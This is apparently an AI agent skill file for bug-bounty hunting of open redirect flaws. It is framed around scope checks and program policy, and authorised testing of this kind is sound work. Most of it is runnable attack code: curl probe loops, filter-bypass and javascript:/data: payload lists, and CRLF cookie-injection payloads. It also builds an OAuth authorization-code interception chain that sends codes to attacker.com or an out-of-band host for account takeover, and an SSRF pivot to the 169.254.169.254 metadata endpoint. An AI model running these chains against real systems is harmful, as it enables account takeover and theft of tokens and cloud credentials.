---
name: open-redirect-hunter
description: Systematically hunt for open redirect vulnerabilities across all attack surfaces: URL parameters, path-based redirects, OAuth redirect_uri abuse, post-login/logout flows, meta refresh, JavaScript-based redirects, and header injection. Covers filter bypass techniques (double encoding, protocol tricks, whitespace, CRLF) and full impact chain escalation to account takeover via OAuth code interception, SSRF via redirect chains, and phishing amplification. Use this skill whenever a target has redirect, return, next, url, or destination parameters, or when OAuth callback/redirect_uri testing is in scope. Trigger on phrases like "open redirect", "redirect testing", "url redirect", "redirect_uri bypass", "post-login redirect", "redirect hunter", or when recon reveals parameters named redirect, return, next, url, dest, destination, target, to, continue, forward, r, redir, location, or go.
---

# Open Redirect Hunter Skill

You are hunting for open redirect vulnerabilities. Open redirects are under-valued by many hunters but over-valued by many programs — the key is the impact chain. A standalone open redirect on a random page is Low or Informational. An open redirect on an OAuth authorization server is a Critical account takeover primitive. An open redirect that chains into SSRF filter bypass is High. Your job is not just to find the redirect — it is to build the highest-impact chain the surface supports.

Run all phases. Phase 1 identifies every redirect surface. Phases 2–4 test and bypass. Phase 5 builds impact chains. Phase 6 covers JS-based and header-injection redirects that most hunters miss.

---

## Prerequisites

- Two accounts (attacker + victim) for OAuth chain testing
- Burp Suite or a proxy for observing redirect behavior
- OOB infrastructure (Burp Collaborator / interactsh) for blind redirect confirmation
- All assets confirmed IN SCOPE via `/scope-checker` before active testing

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/open-redirect
export OOB_URL="your-oob-subdomain.oast.fun"  # from interactsh or Burp Collaborator
```

---

## Phase 1 — Surface Enumeration

### Step 1.1 — Identify Redirect-Prone Parameters

```bash
# Scan all recon files for redirect-prone parameter names
REDIR_PARAMS="redirect|return|next|url|dest|destination|target|to|continue"
REDIR_PARAMS+="|forward|r|redir|location|go|ref|referrer|back|returnTo"
REDIR_PARAMS+="|returnUrl|redirectUrl|redirectUri|redirect_uri|successUrl"
REDIR_PARAMS+="|failureUrl|cancelUrl|logoutUrl|postLoginUrl|callback|u|q"

grep -iEh "[?&](${REDIR_PARAMS})=" \
  $TARGET_DIR/recon/api/all-endpoints.txt \
  $TARGET_DIR/recon/api/katana-crawl.txt \
  $TARGET_DIR/recon/js/endpoints-extracted.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/open-redirect/candidate-params.txt

echo "[*] Redirect parameter candidates: $(wc -l < $TARGET_DIR/recon/open-redirect/candidate-params.txt)"
cat $TARGET_DIR/recon/open-redirect/candidate-params.txt
```

### Step 1.2 — Identify Redirect-Prone Endpoints by Path

```bash
# Find endpoints whose path suggests redirect behavior
grep -iE '/(redirect|return|goto|redir|forward|login|logout|signout|
           oauth/authorize|auth/callback|sso|connect|link|unlink|signIn)' \
  $TARGET_DIR/recon/api/all-endpoints.txt \
  $TARGET_DIR/recon/subdomains/live-hostnames.txt 2>/dev/null | \
  sort -u >> $TARGET_DIR/recon/open-redirect/candidate-params.txt

echo "[*] Updated candidate list:"
wc -l $TARGET_DIR/recon/open-redirect/candidate-params.txt
```

### Step 1.3 — Extract Redirect Parameters from JavaScript

```bash
# Look for redirect-related logic in extracted JS
grep -iE '(window\.location|location\.href|location\.replace|location\.assign|
           document\.location|redirect\(|navigate\(|router\.push|
           history\.pushState|history\.replaceState|window\.open)' \
  $TARGET_DIR/recon/js/*.js 2>/dev/null | \
  grep -oP '(\?|&)[a-zA-Z_]+=[^&"'\''\s]+' | sort -u | head -40
```

For each JS-based redirect sink found, record the parameter name and the JS file it was found in for manual testing in Phase 6.

### Step 1.4 — Map OAuth and Post-Auth Redirect Surfaces

These are the highest-priority redirect surfaces. Identify them explicitly:

```bash
# Pull OAuth authorize endpoints with redirect_uri parameter
grep -iE '(/oauth/authorize|/auth/authorize|/connect/authorize|/authorize)' \
  $TARGET_DIR/recon/oauth/auth-endpoints.txt \
  $TARGET_DIR/recon/open-redirect/candidate-params.txt 2>/dev/null | \
  sort -u > $TARGET_DIR/recon/open-redirect/oauth-redirect-surfaces.txt

# Pull post-login and post-logout redirects
grep -iE '(login|logout|signout|signin|callback|return|next|redirect)' \
  $TARGET_DIR/recon/open-redirect/candidate-params.txt | \
  sort -u > $TARGET_DIR/recon/open-redirect/post-auth-surfaces.txt

echo "OAuth redirect surfaces:"
cat $TARGET_DIR/recon/open-redirect/oauth-redirect-surfaces.txt
echo ""
echo "Post-auth redirect surfaces:"
cat $TARGET_DIR/recon/open-redirect/post-auth-surfaces.txt
```

---

## Phase 2 — Basic Detection

### Step 2.1 — Baseline OOB Probe

For every candidate parameter, inject your OOB URL and check for a redirect response:

```bash
while IFS= read -r ENDPOINT; do
  PARAM=$(echo "$ENDPOINT" | grep -oP '(?<=[?&])[a-zA-Z_]+(?==)' | head -1)
  BASE=$(echo "$ENDPOINT" | sed 's/[?#].*//')

  RESPONSE=$(curl -sk -o /dev/null \
    -w "%{http_code} %{redirect_url}" \
    -G "$BASE" \
    --data-urlencode "${PARAM}=https://attacker.com" \
    -H "Cookie: $SESSION_COOKIE" \
    --max-time 8)

  CODE=$(echo "$RESPONSE" | awk '{print $1}')
  LOCATION=$(echo "$RESPONSE" | awk '{print $2}')

  if echo "$CODE" | grep -qE '^3'; then
    echo "[REDIRECT:$CODE] $PARAM= | Location: $LOCATION"
    echo "$ENDPOINT" >> $TARGET_DIR/recon/open-redirect/confirmed-redirects.txt
  fi
done < $TARGET_DIR/recon/open-redirect/candidate-params.txt

echo "[*] Confirmed open redirects: $(wc -l < $TARGET_DIR/recon/open-redirect/confirmed-redirects.txt 2>/dev/null || echo 0)"
```

### Step 2.2 — Test Authenticated vs. Unauthenticated

Repeat the probe loop with and without the session cookie. Some redirect surfaces only trigger after authentication, and some only before:

```bash
# Without auth
curl -sk -o /dev/null -w "%{http_code} %{redirect_url}" \
  -G "$ENDPOINT" \
  --data-urlencode "${PARAM}=https://attacker.com" \
  --max-time 8

# With auth
curl -sk -o /dev/null -w "%{http_code} %{redirect_url}" \
  -G "$ENDPOINT" \
  -H "Cookie: $SESSION_COOKIE" \
  --data-urlencode "${PARAM}=https://attacker.com" \
  --max-time 8
```

### Step 2.3 — Check Response Body for Meta Refresh and JS Redirects

Some redirects don't use HTTP 3xx headers — they redirect via HTML or JavaScript:

```bash
RESPONSE_BODY=$(curl -sk \
  -G "$BASE" \
  --data-urlencode "${PARAM}=https://attacker.com" \
  -H "Cookie: $SESSION_COOKIE" \
  --max-time 8)

# Check for meta refresh
echo "$RESPONSE_BODY" | grep -iE '<meta[^>]+http-equiv=["\x27]?refresh' | head -5

# Check for JS-based redirect
echo "$RESPONSE_BODY" | grep -iE '(window\.location|location\.href|location\.replace|location\.assign)' | head -5

# Check for inline javascript: URI
echo "$RESPONSE_BODY" | grep -iE 'href=["\x27]javascript:' | head -5
```

If attacker-controlled value appears in any of these sinks — open redirect confirmed even without a 3xx.

---

## Phase 3 — Filter Bypass Techniques

When the basic probe is blocked (no redirect to attacker.com), work through this bypass ladder:

### Step 3.1 — URL Authority Confusion

```bash
BASE_URL="[target endpoint]"
PARAM="[parameter name]"
SESSION="[auth cookie]"

BYPASSES=(
  # Backslash tricks (many parsers treat \ as /)
  "https://attacker.com"
  "https://attacker.com/"
  "//attacker.com"
  "/\\attacker.com"
  "https:\/\/attacker.com"
  # @ authority confusion
  "https://target.com@attacker.com"
  "https://target.com:80@attacker.com"
  "https://attacker.com@target.com"   # reversed
  # Subdomain tricks
  "https://attacker.com.target.com"  # filter: starts with attacker.com
  "https://target.com.attacker.com"  # filter: ends with target.com
  # Whitespace injection
  "https://attacker.com%09"
  "https://attacker.com%0a"
  "https://attacker.com%0d"
  " https://attacker.com"
  # Double slash
  "https:///attacker.com"
  "////attacker.com"
  # Null byte
  "https://attacker.com%00.target.com"
  # Fragment abuse
  "https://target.com#https://attacker.com"
  # Path confusion
  "https://target.com/..;/..;/https://attacker.com"
)

for BP in "${BYPASSES[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$BP', safe=':/@#?=&'))")
  RESULT=$(curl -sk -o /dev/null \
    -w "%{http_code} %{redirect_url}" \
    -G "$BASE_URL" \
    --data-urlencode "${PARAM}=${BP}" \
    -H "Cookie: $SESSION" --max-time 8)
  CODE=$(echo "$RESULT" | awk '{print $1}')
  LOCATION=$(echo "$RESULT" | awk '{print $2}')
  echo "[$CODE] $BP | -> $LOCATION"
done | tee $TARGET_DIR/recon/open-redirect/bypass-results.txt
```

### Step 3.2 — Encoding Bypasses

```bash
# Double URL encoding
python3 -c "import urllib.parse; print(urllib.parse.quote(urllib.parse.quote('https://attacker.com')))"
# Output: https%253A%252F%252Fattacker.com

# Unicode encoding
echo "https://attacker.com" | python3 -c "
import sys
url = sys.stdin.read().strip()
encoded = ''.join(f'%u{ord(c):04X}' for c in url)
print(encoded)
"

# HTML entity encoding (for HTML context redirects)
# &#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;attacker.com

# For each encoding variant, test against the parameter
for ENCODED in \
  "https%3A%2F%2Fattacker.com" \
  "https%253A%252F%252Fattacker.com" \
  "%68%74%74%70%73%3a%2f%2fattacker.com"; do
  RESULT=$(curl -sk -o /dev/null -w "%{http_code} %{redirect_url}" \
    "${BASE_URL}?${PARAM}=${ENCODED}" \
    -H "Cookie: $SESSION" --max-time 8)
  echo "$(echo $RESULT | awk '{print $1}') $ENCODED | -> $(echo $RESULT | awk '{print $2}')"
done
```

### Step 3.3 — Protocol-Relative and Alternative Protocol Bypasses

```bash
PROTO_BYPASSES=(
  "//attacker.com"
  "javascript:alert(document.domain)//"
  "javascript:window.location='https://attacker.com'"
  "data:text/html,<script>window.location='https://attacker.com'</script>"
  "vbscript:msgbox(1)"
  "//attacker%2Ecom"
  "//attacker%252Ecom"
)

for BP in "${PROTO_BYPASSES[@]}"; do
  RESULT=$(curl -sk -o /tmp/redir-resp.tmp -w "%{http_code}" \
    -G "$BASE_URL" --data-urlencode "${PARAM}=${BP}" \
    -H "Cookie: $SESSION" --max-time 8)
  # Check response body for JS redirect sink
  BODY_HIT=$(grep -iE '(location|href|src).*attacker' /tmp/redir-resp.tmp | head -1)
  echo "[$RESULT] $BP ${BODY_HIT:+| BODY_HIT: $BODY_HIT}"
done
```

### Step 3.4 — Path-Based Redirect Bypass

Some filters validate the host but not the full path. Test cases where the allowed host appears before the attacker domain:

```bash
# Allowed host prefix tricks
ALLOWED="target.com"

PATH_BYPASSES=(
  "https://$ALLOWED/logout?next=https://attacker.com"
  "https://$ALLOWED@attacker.com/"
  "https://$ALLOWED%2F@attacker.com/"
  "https://attacker.com/$ALLOWED"
  "https://attacker.com?$ALLOWED"
  "https://attacker.com#$ALLOWED"
)

for BP in "${PATH_BYPASSES[@]}"; do
  RESULT=$(curl -sk -o /dev/null -w "%{http_code} %{redirect_url}" \
    -G "$BASE_URL" --data-urlencode "${PARAM}=${BP}" \
    -H "Cookie: $SESSION" --max-time 8)
  echo "$(echo $RESULT | awk '{print $1}') | $BP | -> $(echo $RESULT | awk '{print $2}')"
done
```

---

## Phase 4 — OAuth Redirect URI Testing

OAuth `redirect_uri` open redirects are the highest-impact variant. A confirmed open redirect on the authorization server allows authorization code interception and full account takeover.

### Step 4.1 — redirect_uri Filter Characterization

```bash
AUTH_SERVER="https://[auth-server]"
CLIENT_ID="[client_id]"
REGISTERED_URI="https://app.target.com/oauth/callback"
BASE_AUTH="$AUTH_SERVER/oauth/authorize?client_id=$CLIENT_ID&response_type=code&scope=openid"

# Test what the filter accepts
OAUTH_BYPASSES=(
  # Path extension
  "${REGISTERED_URI}/extra"
  "${REGISTERED_URI}?extra=param"
  "${REGISTERED_URI}#fragment"
  # Subdomain
  "https://evil.app.target.com/oauth/callback"
  # Path traversal on registered URI
  "${REGISTERED_URI}/../../../attacker.com"
  "${REGISTERED_URI}%2F..%2F..%2Fattacker.com"
  # Different TLD
  "https://app.target.co/oauth/callback"
  # Open redirect on the registered domain as the redirect_uri value
  # (if target.com itself has an open redirect elsewhere)
  "https://app.target.com/redirect?url=https://attacker.com"
)

for URI in "${OAUTH_BYPASSES[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$URI'))")
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${BASE_AUTH}&redirect_uri=${ENCODED}&state=test123" \
    --max-time 8)
  echo "[$STATUS] $URI"
done | tee $TARGET_DIR/recon/open-redirect/oauth-redirect-bypass.txt
```

### Step 4.2 — Code Interception Chain

If the OAuth server accepts a `redirect_uri` that points to a page you control (directly or via an open redirect on the registered domain), build the full ATO PoC:

```bash
# Step 1: Identify open redirect on the registered domain
# e.g. https://app.target.com/redirect?url=https://attacker.com

# Step 2: Construct the authorization URL using the open redirect as redirect_uri
MALICIOUS_URI="https://app.target.com/redirect?url=https://attacker.com/capture"
ATTACK_URL="${BASE_AUTH}&redirect_uri=$(python3 -c "import urllib.parse; \
  print(urllib.parse.quote('$MALICIOUS_URI'))")&state=test123"

echo "ATO attack URL:"
echo "$ATTACK_URL"
echo ""
echo "When victim clicks this URL and authorizes the app:"
echo "  -> OAuth server issues code and redirects to MALICIOUS_URI"
echo "  -> MALICIOUS_URI (open redirect) redirects to attacker.com/capture?code=CODE"
echo "  -> Attacker receives the authorization code"
echo "  -> Attacker exchanges code for access token at /oauth/token"
echo "  -> Full account takeover"
```

### Step 4.3 — Confirm with Interactsh

```bash
# Replace attacker.com with your OOB URL to confirm code delivery
MALICIOUS_URI="https://app.target.com/redirect?url=http://$OOB_URL/oauth-code-capture"
ATTACK_URL_OOB="${BASE_AUTH}&redirect_uri=$(python3 -c "import urllib.parse; \
  print(urllib.parse.quote('$MALICIOUS_URI'))")&state=confirm123"

# Browse to ATTACK_URL_OOB and authorize
# Observe OOB callback — check if ?code= appears in the captured request URL
echo "[*] Monitor OOB for: http://$OOB_URL/oauth-code-capture?code=[value]"
```

---

## Phase 5 — Impact Chain Escalation

### Step 5.1 — SSRF via Redirect Chain

A server-side redirect following an open redirect can pivot to internal targets. This is the SSRF filter bypass chain covered in `/ssrf-hunter` Phase 5.3, but triggered via open redirect:

```bash
# Test: does the application follow redirects server-side?
# If the server fetches the URL value instead of sending the browser there:
SSRF_TEST="https://[open-redirect-endpoint]?${PARAM}=http://$OOB_URL/ssrf-via-redirect"

RESPONSE=$(curl -sk -o /tmp/ssrf-redir.tmp -w "%{http_code}" \
  "$SSRF_TEST" --max-time 10)

echo "[$RESPONSE] Check OOB for server-initiated request"

# If OOB shows request from the TARGET server IP (not your IP) — SSRF confirmed
# Then pivot using the open redirect to reach internal metadata:
METADATA_CHAIN="https://[open-redirect-endpoint]?${PARAM}=http://169.254.169.254/latest/meta-data/"
curl -sk "$METADATA_CHAIN" --max-time 10 | head -20
```

### Step 5.2 — Authentication Token Theft via Redirect

If the open redirect parameter appears in a post-login or SSO flow, the authentication token may be appended to the redirect URL:

```bash
# Log in with the attacker-controlled redirect parameter set to your OOB URL
# Some applications append session tokens, JWT, or auth codes to the redirect target:
# e.g. https://attacker.com/capture?token=[session_token]

# Test by setting redirect to your OOB URL and observing what query params arrive
curl -sk -X POST "https://$TARGET_DOMAIN/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker%40email.com&password=yourpassword" \
  -d "${PARAM}=http://$OOB_URL/post-login-capture" \
  -w "\n[%{http_code}] %{redirect_url}" --max-time 10

echo "[*] Monitor OOB for query parameters on post-login redirect"
```

### Step 5.3 — Phishing Amplification (Scope and Program Assessment)

Before claiming phishing impact, verify the program treats it as a valid impact vector. Check program scope for "phishing" explicitly:

```bash
# Assess redirect for phishing chain:
# 1. Is the source page a login page or trusted internal page?
# 2. Does the redirect happen BEFORE user interaction (auto-redirect) or after a click?
# 3. Is the source domain high-trust (bank, payment processor, auth server)?

echo "Phishing impact assessment:"
echo "  Source URL: $BASE_URL?$PARAM=https://attacker.com"
echo "  Source domain trust level: [HIGH / MEDIUM / LOW]"
echo "  Redirect trigger: [AUTO / USER_CLICK]"
echo "  Program explicitly accepts phishing impact: [YES / NO / CHECK POLICY]"
echo ""
echo "Only include phishing as primary impact if the program policy permits it."
echo "If the program excludes phishing, escalate via SSRF or OAuth chain instead."
```

### Step 5.4 — Token Leakage via Referrer on Redirect

If the redirect passes through a page that loads third-party resources, query parameters (including tokens or codes) in the redirect URL will be sent in `Referer` headers to those third parties:

```bash
# Check: what does the redirect landing page load?
curl -sk "https://attacker.com" | \
  grep -iE '(src|href|action)=["'\''](https?://[^"'\''>]+)' | \
  grep -v attacker.com | head -20

# If the post-redirect page loads third-party scripts and the URL contains a token:
# Document the Referer leakage chain:
# 1. Victim authorizes OAuth → code lands at redirect URL
# 2. Redirect URL (on attacker.com) loads a third-party analytics script
# 3. Referrer header contains the code: Referer: https://attacker.com/capture?code=XYZ
# 4. Third party now has the authorization code
```

---

## Phase 6 — Advanced Surfaces

### Step 6.1 — Header Injection via Redirect Parameter

If a redirect parameter value is reflected into a `Location` header without sanitization, CRLF injection may be possible:

```bash
# Test CRLF injection into Location header via redirect parameter
CRLF_PAYLOADS=(
  "https://attacker.com%0d%0aSet-Cookie:session=hijacked"
  "https://attacker.com%0aSet-Cookie:session=hijacked"
  "https://attacker.com%0d%0aX-Injected-Header:pwned"
  "https://attacker.com%E5%98%8D%E5%98%8ASet-Cookie:session=hijacked"  # Unicode CRLF
)

for PAYLOAD in "${CRLF_PAYLOADS[@]}"; do
  HEADERS=$(curl -sk -D - -o /dev/null \
    -G "$BASE_URL" --data-urlencode "${PARAM}=${PAYLOAD}" \
    -H "Cookie: $SESSION" --max-time 8 | head -20)
  echo "=== $PAYLOAD ==="
  echo "$HEADERS" | grep -iE '(location|set-cookie|x-injected)'
done | tee $TARGET_DIR/recon/open-redirect/crlf-results.txt

# If injected header appears in response — CRLF injection confirmed
# CRLF in Location header = separate High/Critical finding (header injection, cookie hijack)
```

### Step 6.2 — JavaScript-Based Redirect Sinks

Redirects implemented in JavaScript require different testing — they won't appear in curl responses without JS execution. Map them from JS analysis:

```bash
# From Phase 1.3 JS redirect sinks, identify which parameters feed JS redirect code
# Test in browser (or with a headless tool) for these patterns:

# Pattern 1: window.location = getParam('redirect')
# Pattern 2: location.href = document.getElementById('next').value
# Pattern 3: router.push(searchParams.get('to'))

# For each JS sink, verify the value flows from user input to the sink without sanitization:
grep -iE '(window\.location|location\.href|location\.replace|location\.assign)' \
  $TARGET_DIR/recon/js/*.js 2>/dev/null | \
  grep -iE '(param|query|search|hash|location|get\()' | head -20
```

### Step 6.3 — Post-Logout Redirect

Post-logout redirects are often less scrutinized than login redirects:

```bash
# Test redirect after logout
for PAYLOAD in \
  "https://attacker.com" \
  "//attacker.com" \
  "/\\attacker.com"; do
  RESULT=$(curl -sk -o /dev/null -w "%{http_code} %{redirect_url}" \
    -X POST "https://$TARGET_DOMAIN/logout" \
    -H "Cookie: $SESSION_COOKIE" \
    --data-urlencode "${PARAM}=${PAYLOAD}" \
    --max-time 8)
  echo "[$RESULT] $PAYLOAD"
done
```

### Step 6.4 — Password Reset and Email Confirmation Redirects

```bash
# Password reset flows often include a redirect after password change
# Email confirmation flows often redirect after confirmation
# These are high-trust contexts where a redirect may carry sensitive tokens

# Identify reset/confirm endpoints
grep -iE '(password.reset|reset.password|forgot.password|confirm.email|
           email.confirm|verify|account.confirm)' \
  $TARGET_DIR/recon/api/all-endpoints.txt 2>/dev/null

# Test redirect parameter on these endpoints:
# If the reset URL contains a token as a query parameter AND has an open redirect,
# the token may be leaked via Referer to the attacker's page
```

---

## Validation Standard

Do not log a Finding until the appropriate bar is met:

| Variant | Minimum evidence to log as Finding |
|---|---|
| Basic open redirect | HTTP 3xx with `Location` pointing to attacker-controlled domain confirmed, OR response body reflects attacker URL in redirect sink |
| OAuth code interception chain | Auth server accepts manipulated `redirect_uri`, authorization code confirmed delivered to attacker-controlled endpoint (OOB or direct) |
| SSRF via redirect chain | OOB callback from target server IP (not hunter IP) confirmed when redirect points to internal address |
| CRLF via redirect | Injected header appears in raw response headers — `Set-Cookie` or custom header present |
| Token leakage via Referer | Confirm actual token/code value appears in OOB capture's request URL — not just a redirect |
| JS-based redirect | Confirm user-controlled value reaches the JS redirect sink unmodified — requires browser testing or code audit evidence |

**For all findings:** Document the exact payload URL, the exact response headers (for 3xx) or response body excerpt (for JS/meta), and the full impact chain.

---

## Output Summary

All output written to `$TARGET_DIR/recon/open-redirect/`:

| File | Contents |
|---|---|
| `candidate-params.txt` | All identified redirect-prone parameters and endpoints |
| `oauth-redirect-surfaces.txt` | OAuth authorize endpoints with redirect_uri parameter |
| `post-auth-surfaces.txt` | Post-login and post-logout redirect surfaces |
| `confirmed-redirects.txt` | Parameters confirmed to redirect to attacker.com |
| `bypass-results.txt` | Filter bypass attempt results |
| `oauth-redirect-bypass.txt` | OAuth redirect_uri manipulation results |
| `crlf-results.txt` | CRLF injection test results |

---

## Severity Reference

| Finding | Severity |
|---|---|
| OAuth code interception via redirect_uri open redirect — ATO chain | Critical |
| SSRF via redirect chain reaching cloud metadata | Critical |
| CRLF injection via redirect parameter — cookie hijack | High–Critical |
| Token/session value leaked to attacker via post-login redirect | High |
| Open redirect on OAuth authorization server (no full ATO chain yet) | High |
| Open redirect on login/SSO page (phishing + session theft risk) | Medium–High |
| Open redirect on general authenticated page | Low–Medium |
| Open redirect on logout page only | Low |
| Open redirect to same-domain path only (no cross-origin) | Informational |
| Open redirect with no user interaction path (direct URL only) | Informational–Low |

---

## Guiding Principles

- **The redirect alone is not the finding — the chain is.** A bare open redirect on a general page is Low at most on most programs. Build the highest-impact chain the surface supports before writing the report. OAuth code interception, SSRF pivot, or token leakage are what make this Critical.
- **OAuth redirect_uri surfaces are always highest priority.** If an open redirect exists anywhere on the registered OAuth domain, test immediately whether it can be used as a `redirect_uri` bypass. This is the Critical account takeover path.
- **CRLF injection via redirect is a separate, higher-severity finding.** If `%0d%0a` or Unicode CRLF variants produce injected headers, document it as CRLF injection in addition to (or instead of) the open redirect, depending on severity.
- **JavaScript-based redirects require browser confirmation.** `curl` will not execute JS. If a JS redirect sink is found, confirm in a real browser or headless tool before claiming the finding. A source-code finding alone without execution confirmation is a Lead, not a Finding.
- **Phishing impact is program-dependent.** Check the program's policy explicitly. Many programs exclude phishing as a standalone impact. Do not anchor the report on phishing if SSRF or OAuth chain impact is available — use the stronger impact.
- **Do not submit open redirects on logout pages as standalone findings** unless the program explicitly lists them, or you can attach a token leakage or CSRF chain to them.
- **Run /triager before submitting.** A standalone open redirect with no chain and phishing as the only claimed impact will almost always be N/A'd or downgraded to Informational.
